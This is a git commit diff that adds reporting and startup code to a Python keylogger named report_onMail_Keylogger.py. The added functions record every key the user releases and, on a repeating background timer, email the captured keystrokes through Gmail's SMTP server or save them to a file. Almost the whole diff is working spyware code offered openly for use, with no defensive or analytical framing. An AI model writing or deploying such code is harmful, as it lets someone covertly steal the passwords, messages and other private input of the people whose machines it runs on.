192a8f68b4f2d91ad50eaa255d961e2e05b978e2
Kush Gupta <74309241+iamKushGupta@users.noreply.github.com>
2021-08-14 23:20:11 +0530

    Update report_onMail_Keylogger.py

--- report_onMail_Keylogger.py
+++ report_onMail_Keylogger.py
@@ -42,6 +42,36 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:  # opens the required file in Write mode (or creates it)
             print(self.log, file=f)                   # write the keylogs to the file
         print(f"[+=] Saved {self.filename}.txt")
-        
     
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+        
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # print(f"[{self.filename}] - {self.log}")                              # IF you want to print in the console/terminal, uncomment given line.
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+        
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)          # Starts the keylogger
+        self.report()    # Reporting starts....
+        keyboard.wait()
 
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()       
